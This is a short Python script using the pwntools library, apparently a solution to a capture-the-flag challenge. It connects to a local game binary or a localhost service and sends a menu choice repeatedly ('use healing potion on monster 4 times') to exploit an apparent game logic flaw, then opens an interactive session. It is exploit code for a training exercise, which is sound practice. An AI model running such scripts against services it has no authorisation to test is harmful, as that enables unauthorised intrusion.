from pwn import *

elf = context.binary = ELF('../src/game')

if args.REMOTE:
    io = remote('127.0.0.1', 9999)
else:
    io = elf.process(stdin=PTY)


# use healing potion on monster 4 times
for i in range(4):
    io.recvuntil(b'>')
    io.sendline(b'2')
    io.sendline(b'2')

io.interactive()
